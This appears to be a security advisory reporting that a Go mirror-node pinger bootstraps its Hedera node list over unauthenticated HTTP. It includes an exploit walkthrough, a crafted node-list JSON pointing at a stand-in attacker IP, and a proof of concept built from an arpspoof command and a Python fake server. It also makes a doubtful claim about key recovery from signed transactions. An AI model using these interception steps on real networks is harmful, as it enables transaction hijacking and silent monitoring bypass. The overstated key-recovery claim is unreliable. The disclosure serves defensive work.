### Title
Unauthenticated HTTP Mirror Node Bootstrap Enables MITM Network Hijacking of Operator-Signed Transactions

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` issues a plaintext HTTP GET to the mirror node REST endpoint with no TLS enforcement, no certificate pinning, and no response integrity verification. An attacker with local network access who can ARP-spoof the path between the pinger and the mirror node can return a crafted `nodesEnvelope` containing attacker-controlled `ServiceEndpoints`, causing the Hiero SDK client to be bootstrapped with attacker gRPC infrastructure. All subsequent operator-signed `CryptoTransfer` transactions are then submitted to the attacker's server rather than the real Hedera network.

### Finding Description

**Exact code path:**

`pinger/config.go` line 37 — the `mirrorRest` URL is user-supplied and the documented default example is `http://mirror-rest:5551` (plaintext HTTP): [1](#0-0) 

`pinger/mirror_node_client.go` line 46 — the HTTP client is constructed with no TLS configuration, no certificate pinning, and no custom transport: [2](#0-1) 

`pinger/mirror_node_client.go` lines 79–98 — the GET is issued over plaintext HTTP; the only validation performed is an HTTP status code range check and JSON decode. There is no signature verification, no HMAC, no TLS, and no allowlist of expected IP ranges for the returned endpoints: [3](#0-2) 

`pinger/mirror_node_client.go` lines 102–124 — attacker-controlled `DomainName`/`IPAddressV4` and `Port` values from the response are directly assembled into the network map with no validation: [4](#0-3) 

`pinger/sdk_client.go` lines 18–22 — the poisoned network map is passed directly to `hiero.ClientForNetwork()`, and the operator private key is then set on this client at line 45: [5](#0-4) 

`pinger/transfer.go` lines 29–33 — the client executes a signed `CryptoTransfer` against whatever gRPC endpoints were bootstrapped: [6](#0-5) 

**Root cause:** The code assumes the mirror node REST response is trustworthy. There is no transport security requirement (HTTPS), no response authentication, and no validation of the returned endpoint addresses. The `network=other` path is the only one that calls `buildNetworkFromMirrorNodes()`; the named networks (`testnet`, `mainnet`, `previewnet`) use hardcoded SDK endpoints and are not affected. [7](#0-6) 

**Exploit flow:**

1. Attacker gains local network access (same L2 segment as the pinger pod/VM).
2. Attacker ARP-spoofs the pinger's ARP cache to redirect traffic destined for the mirror node REST host to the attacker's machine.
3. Pinger issues `GET http://mirror-rest:5551/api/v1/network/nodes`.
4. Attacker intercepts the request and responds with HTTP 200 and a crafted JSON body:
   ```json
   {"nodes":[{"node_account_id":"0.0.3","service_endpoints":[{"ip_address_v4":"<attacker-ip>","port":50211}]}],"links":{"next":null}}
   ```
5. `fetchMirrorNodeNetwork()` passes the status check (200 OK) and JSON decode, returns `{"<attacker-ip>:50211": AccountID{0,0,3}}`.
6. `hiero.ClientForNetwork()` is called with this map; the operator private key is set on the resulting client.
7. Every subsequent `CryptoTransfer.Execute(client)` call sends a fully operator-signed transaction to the attacker's gRPC listener.

### Impact Explanation

- **Transaction redirection:** All operator-signed `CryptoTransfer` transactions are delivered to attacker infrastructure. The real Hedera network never receives them, so no actual transfers occur while the pinger reports (or can be made to report) success.
- **Signed transaction exposure:** The attacker receives raw signed transaction bytes. Within the Hedera transaction validity window (default 120 seconds), these could be replayed against the real network by the attacker directly.
- **Monitoring/alerting bypass:** The attacker's gRPC server can return synthetic success receipts, causing the pinger to log `transfer success` while no real transfers execute — defeating the liveness/health-check purpose of the pinger entirely.
- **Operator key inference risk:** Repeated collection of signed transactions under known inputs could assist offline key-recovery analysis.

Severity: **High** — direct financial and operational impact; operator funds are not transferred, and the monitoring system is silently compromised.

### Likelihood Explanation

- **Precondition:** `HIERO_MIRROR_PINGER_NETWORK=other` with an `http://` mirror REST URL. The documented default example in `config.go` is explicitly `http://mirror-rest:5551`, making plaintext HTTP the natural/expected configuration for custom deployments.
- **Attacker capability:** ARP spoofing requires only local network adjacency — no credentials, no exploits. In Kubernetes environments (evidenced by the `Dockerfile` and `/tmp/alive` liveness probe), a compromised pod in the same network namespace suffices. In VM or bare-metal deployments it is trivially achievable.
- **Repeatability:** The attack is persistent for the lifetime of the pinger process since the network map is built once at startup and never refreshed.
- **No existing mitigations:** The HTTP status check and JSON decode provide zero protection against a MITM returning a well-formed crafted response.

### Recommendation

1. **Enforce HTTPS:** Validate that `cfg.mirrorRest` begins with `https://` when `network=other`; reject `http://` URLs at config load time (`config.go` `loadConfig()`).
2. **TLS with certificate verification:** If a custom CA is needed, expose a `mirrorRestTLSCACert` config option and configure the `http.Client` transport accordingly. Never disable `InsecureSkipVerify`.
3. **Endpoint allowlist:** After fetching the node list, validate that returned IP addresses/hostnames fall within an operator-configured allowlist before using them.
4. **Periodic re-bootstrap with integrity check:** If the network map must be refreshed, compare new results against the previous known-good map and alert/abort on unexpected changes.

### Proof of Concept

```bash
# 1. Start a fake gRPC server on attacker machine (attacker-ip:50211)
#    that accepts any CryptoTransfer and returns a fake SUCCESS receipt.

# 2. ARP-spoof the pinger host so mirror-rest resolves to attacker-ip:
arpspoof -i eth0 -t <pinger-ip> <mirror-rest-ip>

# 3. On attacker machine, serve the crafted mirror node response:
python3 -c "
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({'nodes':[{'node_account_id':'0.0.3',
            'service_endpoints':[{'ip_address_v4':'<attacker-ip>','port':50211}]}],
            'links':{'next':None}}).encode()
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(body)
http.server.HTTPServer(('0.0.0.0', 5551), H).serve_forever()
"

# 4. Start pinger with:
#    HIERO_MIRROR_PINGER_NETWORK=other
#    HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551
#    HIERO_MIRROR_PINGER_OPERATOR_KEY=<real-key>

# 5. Observe: pinger logs "transfer success" while attacker's gRPC server
#    receives fully operator-signed CryptoTransfer transaction bytes.
#    No transfer occurs on the real Hedera network.
```
